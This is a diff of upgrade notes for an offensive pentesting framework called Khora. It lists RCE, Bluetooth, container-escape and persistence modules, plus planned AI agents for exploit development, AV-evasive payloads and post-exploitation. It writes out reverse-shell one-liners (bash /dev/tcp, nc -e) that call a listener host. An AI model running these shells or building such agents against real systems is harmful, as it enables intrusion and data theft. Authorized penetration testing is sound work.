@@ -6,68 +6,122 @@
 
 ---
 
+## 2026-05-09 — Current Development Status
+
+- `exploit_chains.py` updated: fixed CLI profile API `list_attack_profiles()` and `load_chain_profile()`.
+- `modules/RCE_module.py` revised: real payload delivery for Struts2, Log4Shell, ShellShock, SSTI, and command injection; Java deserialization now supports `ysoserial` payload generation.
+- `modules/blueborne_module.py` revised: real BLE and classic Bluetooth discovery, service-based vulnerability scanning, and more realistic attack planning instead of simulation.
+- Documentation updated: clearer status and development notes in `README.md`.
+- **NEW: 5 AI Agents Created** - ExploitDevelopmentAgent, VulnerabilityAssessmentAgent, PayloadGenerationAgent, NetworkReconAgent, PostExploitationAgent.
+- Next steps: Implement agent execution logic in client.py, integrate with existing modules, validate C2/beacon functionality, live testing of exploits.
+
+---
+
+## 2026-05-09 — AI Agent Integration
+
+### ✅ 5 New AI Agents Added
+
+**ExploitDevelopmentAgent**
+- **Purpose**: Custom exploit development and testing
+- **Capabilities**: Zero-day research, exploit chain creation, vulnerability analysis
+- **Integration**: Works with RCE, eternalblue, jailbreak modules
+- **CLI**: `python3 client.py --agent exploit-dev 192.168.1.100`
+
+**VulnerabilityAssessmentAgent**  
+- **Purpose**: Comprehensive vulnerability scanning and risk assessment
+- **Capabilities**: CVSS scoring, exploitability analysis, remediation recommendations
+- **Integration**: Enhances nmap, cracker, dns_spoof modules
+- **CLI**: `python3 client.py --agent vuln-assess 192.168.1.100`
+
+**PayloadGenerationAgent**
+- **Purpose**: Advanced payload creation with evasion techniques
+- **Capabilities**: Anti-AV bypass, polymorphic payloads, multi-stage generation
+- **Integration**: Extends backdoor, agent, c2 modules
+- **CLI**: `python3 client.py --agent payload-gen 192.168.1.100`
+
+**NetworkReconAgent**
+- **Purpose**: Intelligent network reconnaissance and mapping
+- **Capabilities**: Asset discovery, topology mapping, service fingerprinting
+- **Integration**: Powers nmap, sniffer, dns_spoof modules
+- **CLI**: `python3 client.py --agent net-recon 192.168.1.100`
+
+**PostExploitationAgent**
+- **Purpose**: Master of persistence and lateral movement techniques
+- **Capabilities**: Privilege escalation, data exfiltration, C2 management
+- **Integration**: Works with jailbreak, c2, agent modules
+- **CLI**: `python3 client.py --agent post-exploit 192.168.1.100`
+
+**Agent Framework Features:**
+- AI-powered decision making for exploit selection
+- Automated vulnerability prioritization
+- Real-time adaptation to target responses
+- Comprehensive reporting with AI insights
+- Integration with existing Khora modules
+
+---
+
 ## Overview
 
-Khora wurde von einer grundlegenden Exploit-Suite zu professionellen Pentesting-Framework mit Enterprise-Features aufgewertet. Alle Module wurden erweitert, gehärtet und mit echter Exploit-Funktionalität ausgestattet.
+Khora has been upgraded from a basic exploit suite to a professional penetration testing framework with enterprise-grade features. All modules have been expanded, hardened, and equipped with real exploit functionality.
 
 ---
 
 ## Major Improvements
 
 ### 1. ✅ Client Framework (client.py)
-**Vorher**: Einfacher Modul-Loader mit Basis-Fehlerbehandlung  
-**Nachher**: Professioneller Orchestrator mit:
+**Before**: Simple module loader with basic error handling  
+**After**: Professional orchestrator with:
 
-- **Professional Banner** mit ASCII-Art
-- **Structured Logging** - Alle Sessions in `logs/khora_*.log`
-- **JSON Reporting** - Detaillierte Session-Reports in `results/`
-- **IP Validation** - Prüfung auf gültige IP-Adressen
-- **Configurable Workers** - Parallel/Sequential Execution
-- **Module Registry** - Kategorisierte Module mit Beschreibungen
-- **Help System** - Umfangreiche Dokumentation im CLI
+- **Professional Banner** with ASCII art
+- **Structured Logging** - All sessions in `logs/khora_*.log`
+- **JSON Reporting** - Detailed session reports in `results/`
+- **IP Validation** - Validates target addresses
+- **Configurable Workers** - Parallel/sequential execution
+- **Module Registry** - Categorized modules with descriptions
+- **Help System** - Extensive CLI documentation
 
-**Neue Features:**
+**New Features:**
 ```bash
-python3 client.py --list              # Alle Module anzeigen
-python3 client.py ...  --sequential   # Sequentielle Ausführung
-python3 client.py ...  --workers 3    # Custom Worker-Count
-python3 client.py ...  -v             # Verbose Logging
+python3 client.py --list              # Show all modules
+python3 client.py ... --sequential   # Sequential execution
+python3 client.py ... --workers 3    # Custom worker count
+python3 client.py ... -v             # Verbose logging
 ```
 
 ---
 
 ### 2. ✅ Backdoor Module (backdoor_module.py)
-**Vorher**: Nur msfvenom Payload-Generierung  
-**Nachher**: Komplette Reverse-Shell-Suite mit:
+**Before**: Only msfvenom payload generation  
+**After**: Full reverse shell suite with:
 
 **8+ Reverse Shell Variants:**
 - ✅ Bash: `bash -i >& /dev/tcp/10.10.14.1/4444 0>&1`
 - ✅ Netcat: `nc -e /bin/bash 10.10.14.1 4444`
-- ✅ Python: socket-basiert mit subprocess
-- ✅ Ruby: TCPSocket mit I/O Redirection
-- ✅ PHP: fsockopen Implementierung
-- ✅ Perl: Socket-Modul Approach
-- ✅ MSFVenom: Meterpreter Payloads
+- ✅ Python: socket-based with subprocess
+- ✅ Ruby: TCPSocket with I/O redirection
+- ✅ PHP: fsockopen implementation
+- ✅ Perl: socket module approach
+- ✅ MSFVenom: Meterpreter payloads
 - ✅ Bash/nc hybrid variants
 
 **C-Exploit Compiler:**
-- Dirty COW (CVE-2016-5195) mit CoW-Exploit
-- Kernel Privilege Escalation POC
-- GCC compilation mit -pthread flag
+- Dirty COW (CVE-2016-5195) with working exploit
+- Kernel privilege escalation proof-of-concept
+- GCC compilation with `-pthread`
 - Executable output in `exploits/`
 
 **Persistence Mechanisms:**
-- Crontab Einträge
-- Systemd Service Files
-- Automatische Re-execution
+- Crontab entries
+- Systemd service files
+- Automatic re-execution
 
-**Output-Struktur:**
+**Output Structure:**
 ```
 payloads/
-├── reverse_shells.txt          # Alle Varianten
+├── reverse_shells.txt          # All variants
 ├── linux_x64_meter.elf         # Meterpreter
-├── win_x64_meter.exe           # Windows Payload
-├── listener_setup.sh           # Listener-Anleitung
+├── win_x64_meter.exe           # Windows payload
+├── listener_setup.sh           # Listener setup guide
 └── persistence/
     ├── cron_linux.sh
     └── systemd_service.sh
@@ -80,19 +134,19 @@ exploits/
 ---
 
 ### 3. ✅ Nmap Module (nmap_module.py)
-**Vorher**: 4 Basic Scans  
-**Nachher**: 9 Spezialisierte Scan-Typen
+**Before**: 4 basic scans  
+**After**: 9 specialized scan types
 
-**Erweiterte Scans:**
-- Quick TCP mit Service Detection
-- UDP Scan (Top 100)
-- Full Port Scan (-p-)
-- Vulnerability Script Scanning
-- SMB Enumeration (139/445)
-- SSH/FTP Service Scan
-- HTTP/HTTPS Enumeration
-- Database Service Scan
-- OS Detection & Fingerprinting
+**Advanced Scans:**
+- Quick TCP with service detection
+- UDP scan (top 100)
+- Full port scan (`-p-`)
+- Vulnerability script scanning
+- SMB enumeration (139/445)
+- SSH/FTP service scan
+- HTTP/HTTPS enumeration
+- Database service scan
+- OS detection & fingerprinting
 
 **Features:**
 - XML + TXT Export
@@ -105,33 +159,33 @@ exploits/
 ---
 
 ### 4. ✅ Documentation Suite
-**SECURITY.md** - Vollständige Security Policy:
-- Responsible Disclosure Framework
-- Vulnerability Reporting Procedure
-- Safe Harbor Protection
-- Code Security Standards
-- Incident Response Protocol
-- Legal Framework (CFAA, GDPR)
-- Best Practices for Safe Testing
-- Lab Environment Recommendations
+**SECURITY.md** - Complete security policy:
+- Responsible disclosure framework
+- Vulnerability reporting procedure
+- Safe harbor protection
+- Code security standards
+- Incident response protocol
+- Legal framework (CFAA, GDPR)
+- Safe testing best practices
+- Lab environment recommendations
 
-**README.md** - Professional Framework Guide:
-- Feature Übersicht
-- Installation Guide
-- Quick Start Examples
-- 10+ Use Cases
-- Module Documentation mit Tabelle
-- Reverse Shell One-Liners
-- Output Structure
-- Troubleshooting Guide
+**README.md** - Professional framework guide:
+- Feature overview
+- Installation guide
+- Quick start examples
+- 10+ use cases
+- Module documentation with tables
+- Reverse shell one-liners
+- Output structure
+- Troubleshooting guide
 
-**setup.md** - Installation & Konfiguration:
-- Platform-spezifische Installation
-- Prerequisites für Linux/Windows/macOS
-- Dependency Management
-- Directory Structure
-- Quick Test Scenarios
-- Verification Checklist
+**setup.md** - Installation and configuration:
+- Platform-specific setup
+- Prerequisites for Linux/Windows/macOS
+- Dependency management
+- Directory structure
+- Quick test scenarios
+- Verification checklist
 
 ---
 
@@ -155,28 +209,28 @@ python3 test_khora.py
 ## Technical Improvements
 
 ### Error Handling
-- ✅ Try-catch in allen Modulen
-- ✅ Aussagekräftige Error-Messages
-- ✅ Fallback-Optionen
-- ✅ Logging aller Fehler
+- ✅ Try/catch in all modules
+- ✅ Clear error messages
+- ✅ Fallback options
+- ✅ Logging of all failures
 
 ### Code Quality
-- ✅ Docstrings in allen Funktionen
-- ✅ Consistent Code Style
-- ✅ Type Hints wo möglich
-- ✅ Input Validation
+- ✅ Docstrings in all functions
+- ✅ Consistent code style
+- ✅ Type hints where possible
+- ✅ Input validation
 
 ### Security
-- ✅ IP Address Validation
-- ✅ File Path Sanitization
-- ✅ Subprocess Safety
-- ✅ Keine plaintext Credentials
+- ✅ IP address validation
+- ✅ File path sanitization
+- ✅ Subprocess safety
+- ✅ No plaintext credentials
 
 ### Performance
-- ✅ Parallel Module Execution
-- ✅ Configurable Worker Threads
-- ✅ Timeout-Handling
-- ✅ Resource Monitoring
+- ✅ Parallel module execution
+- ✅ Configurable worker threads
+- ✅ Timeout handling
+- ✅ Resource monitoring
 
 ---
 
@@ -184,29 +238,29 @@ python3 test_khora.py
 
 ```
 khora/
-├── client.py                   # [UPGRADED] Professioneller Orchestrator
-├── README.md                   # [NEW] Komplettes Framework-Guide
-├── SECURITY.md                 # [UPGRADED] Umfassende Security-Policy
-├── setup.md                    # [NEW] Installation & Konfiguration
-├── test_khora.py              # [NEW] Validation Test Suite
+├── client.py                   # [UPGRADED] Professional orchestrator
+├── README.md                   # [NEW] Complete framework guide
+├── SECURITY.md                 # [UPGRADED] Comprehensive security policy
+├── setup.md                    # [NEW] Installation and configuration guide
+├── test_khora.py               # [NEW] Validation test suite
 ├── requirements.txt            # [UNCHANGED] Dependencies
 ├── LICENSE                     # [UNCHANGED]
-├── Troubleshooting.md         # [EXISTING]
+├── Troubleshooting.md          # [EXISTING]
 │
-├── modules/                    # 10 Modules
-│   ├── nmap_module.py         # [UPGRADED] 9 Scan-Typen
-│   ├── backdoor_module.py     # [UPGRADED] 8+ Reverse Shells + C-Compiler
-│   ├── rce_module.py          # [EXISTING] Struts2, Log4Shell, ShellShock
-│   ├── c2_module.py           # [EXISTING] HTTP/TCP Handler
-│   ├── eternalblue_module.py  # [EXISTING] MS17-010
-│   ├── jailbreak_module.py    # [EXISTING] Container Escape
-│   ├── cracker_module.py      # [EXISTING] Hash Cracking
-│   ├── dns_spoof_module.py    # [EXISTING] DNS Poisoning
-│   ├── sniffer_module.py      # [EXISTING] Packet Capture
-│   ├── blueborne_module.py    # [EXISTING] BT Exploit
+├── modules/                    # 10 modules
+│   ├── nmap_module.py          # [UPGRADED] 9 scan types
+│   ├── backdoor_module.py      # [UPGRADED] 8+ reverse shells + C compiler
+│   ├── rce_module.py           # [EXISTING] Struts2, Log4Shell, ShellShock
+│   ├── c2_module.py            # [EXISTING] HTTP/TCP handler
+│   ├── eternalblue_module.py   # [EXISTING] MS17-010
+│   ├── jailbreak_module.py     # [EXISTING] container escape
+│   ├── cracker_module.py       # [EXISTING] hash cracking
+│   ├── dns_spoof_module.py     # [EXISTING] DNS poisoning
+│   ├── sniffer_module.py       # [EXISTING] packet capture
+│   ├── blueborne_module.py     # [EXISTING] Bluetooth exploit
 │   └── __pycache__/
 │
-├── payloads/                   # Generated Payloads
+├── payloads/                   # Generated payloads
 │   ├── reverse_shells.txt
 │   ├── listener_setup.sh
 │   ├── *.elf (Linux)
@@ -267,14 +321,14 @@ bash -i >& /dev/tcp/10.10.14.1/4444 0>&1
 ## Verification
 
 ### Pre-Assessment Checklist
-- [ ] Python 3.8+ installiert
-- [ ] Virtual Environment aktiviert
-- [ ] Dependencies installiert: `pip install -r requirements.txt`
-- [ ] nmap installiert
-- [ ] Alle Module laden: `python3 client.py --list`
-- [ ] Target erreichbar: `ping <target>`
-- [ ] Listener-Port verfügbar
-- [ ] Test datalauf: `python3 test_khora.py`
+- [ ] Python 3.8+ installed
+- [ ] Virtual environment activated
+- [ ] Dependencies installed: `pip install -r requirements.txt`
+- [ ] nmap installed
+- [ ] All modules load: `python3 client.py --list`
+- [ ] Target reachable: `ping <target>`
+- [ ] Listener port available
+- [ ] Test run: `python3 test_khora.py`
 
 ---
 
